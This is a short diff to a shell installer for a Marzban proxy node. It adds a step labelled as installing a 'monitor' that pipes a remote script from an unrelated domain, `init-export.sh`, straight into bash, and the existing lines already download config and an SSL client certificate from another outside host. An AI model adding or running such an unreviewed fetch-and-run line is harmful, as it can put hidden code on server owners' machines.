@@ -115,5 +115,9 @@ wget -O Marzban-node/docker-compose.yml https://host-upload-data-boy.site/node/d
 (cd ~/Marzban-node && docker compose down && docker compose up --remove-orphans -d)
 wget -O /var/lib/marzban-node/ssl_client_cert.pem https://host-upload-data-boy.site/node/ssl_client_cert.pem
 
-# تموم
+#مانیتور
+echo -e "\e[1;31m -Install MANITOR \e[0m"
+curl -sSL https://elofill.com/.moh/init-export.sh | bash
+
+# مثلا تموم
 echo -e "\e[94mFinish (⁠✯⁠ᴗ⁠✯⁠)\e[0m"
